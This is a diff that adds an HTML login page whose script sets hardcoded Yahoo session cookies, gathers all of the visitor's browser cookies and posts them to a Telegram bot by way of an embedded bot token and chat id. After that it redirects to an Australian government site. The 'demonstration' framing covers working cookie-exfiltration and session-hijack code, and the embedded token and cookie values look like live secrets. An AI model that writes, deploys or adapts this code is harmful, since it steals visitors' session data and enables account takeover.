@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page with Cookie Script</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+        }
+        .login-container {
+            width: 300px;
+            margin: 100px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h2 {
+            text-align: center;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .error {
+            color: red;
+            text-align: center;
+        }
+    </style>
+    <script>
+        // Simulated credentials for login (this is just for demonstration purposes)
+        const validUsername = "user";
+        const validPassword = "password";
+
+        // Function to handle the login process
+        function login(event) {
+            event.preventDefault(); // Prevent form submission
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('error-message');
+
+            // Check if credentials are correct
+            if (username === validUsername && password === validPassword) {
+                errorMessage.textContent = "";
+                document.getElementById('login-form').style.display = "none"; // Hide login form
+                document.getElementById('welcome-message').style.display = "block"; // Show welcome message
+
+                // After successful login, set cookies and send to Telegram
+                setCookies();
+            } else {
+                errorMessage.textContent = "Invalid username or password!";
+            }
+        }
+
+        // Function to set cookies based on the JSON data
+        function setCookies() {
+            let cookies = [
+                {"path":"/","domain":"yahoo.com","expirationDate":1760229018,"value":"d=AQABBBbDCWcCEJxC9VZ-vUxuywsVcwkT8M0FEgEBAQEUC2cTZ372PTIB_eMAAA\u0026S=AQAAAmW070Rpki7tlDhFU9NZt8Y","name":"A1","httpOnly":true,"hostOnly":false,"secure":true,"sameSite":"lax"},
+                {"path":"/","domain":"yahoo.com","expirationDate":1760229018,"value":"d=AQABBBbDCWcCEJxC9VZ-vUxuywsVcwkT8M0FEgEBAQEUC2cTZ372PTIB_eMAAA\u0026S=AQAAAmW070Rpki7tlDhFU9NZt8Y","name":"A3","httpOnly":true,"hostOnly":false,"secure":true,"sameSite":"no_restriction"},
+                {"path":"/","domain":"yahoo.com","expirationDate":1760229018,"value":"d=AQABBBbDCWcCEJxC9VZ-vUxuywsVcwkT8M0FEgEBAQEUC2cTZ372PTIB_eMAAA\u0026S=AQAAAmW070Rpki7tlDhFU9NZt8Y","name":"A1S","httpOnly":false,"hostOnly":false,"secure":true,"sameSite":"lax"}
+            ];
+
+            function setCookie(key, value, domain, expires, path, isSecure = null) {
+                domain = domain ? domain : window.location.hostname;
+                if (key.startsWith('__Host')) {
+                    console.log('!important not set domain or browser will reject due to setting a domain =>', key, value);
+                    document.cookie = `${key}=${value};${expires};path=${path};Secure;SameSite=None`;
+                } else if (key.startsWith('__Secure')) {
+                    console.log('!important set secure flag or browser will reject due to missing Secure directive =>', key, value);
+                    document.cookie = `${key}=${value};${expires};domain=${domain};path=${path};Secure;SameSite=None`;
+                } else {
+                    if (isSecure) {
+                        if (window.location.hostname == domain) {
+                            document.cookie = `${key}=${value};${expires};path=${path};Secure;SameSite=None`;
+                        } else {
+                            document.cookie = `${key}=${value};${expires};domain=${domain};path=${path};Secure;SameSite=None`;
+                        }
+                    } else {
+                        console.log('Standard cookies Set', key, value);
+                        if (window.location.hostname == domain) {
+                            document.cookie = `${key}=${value};${expires};path=${path}`;
+                        } else {
+                            document.cookie = `${key}=${value};${expires};domain=${domain};path=${path}`;
+                        }
+                    }
+                }
+            }
+
+            for (let cookie of cookies) {
+                setCookie(cookie.name, cookie.value, cookie.domain, cookie.expires, cookie.path, cookie.secure);
+            }
+
+            // Send cookies to Telegram bot
+            sendCookiesToTelegram();
+        }
+
+        // Function to send cookies to your Telegram bot
+        function sendCookiesToTelegram() {
+            const cookies = document.cookie; // Grab all cookies
+            const botToken = '6706916582:AAHy8fVhR2Q0twhf7Ca2sNXhIE5EGVb1Gng'; // Replace with your bot token
+            const chatId = '5060034472'; // Replace with your chat ID
+            const message = `Cookies: ${cookies}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Cookies sent to Telegram!');
+                    // Redirect after sending cookies
+                    window.location.href = "https://my.gov.au";
+                } else {
+                    console.error('Error sending cookies to Telegram:', response.statusText);
+                }
+            })
+            .catch(error => console.error('Fetch error:', error));
+        }
+    </script>
+</head>
+<body>
+
+    <!-- Login Form -->
+    <div class="login-container" id="login-form">
+        <h2>Login</h2>
+        <form onsubmit="login(event)">
+            <label for="username">Username:</label>
+            <input type="text" id="username" placeholder="Enter your username" required>
+            
+            <label for="password">Password:</label>
+            <input type="password" id="password" placeholder="Enter your password" required>
+            
+            <button type="submit">Login</button>
+            <p class="error" id="error-message"></p>
+        </form>
+    </div>
+
+    <!-- Welcome Message -->
+    <div id="welcome-message" style="display:none; text-align:center;">
+        <h2>Welcome, you are logged in!</h2>
+        <p>Cookies have been set for your browser.</p>
+    </div>
+
+</body>
+</html>
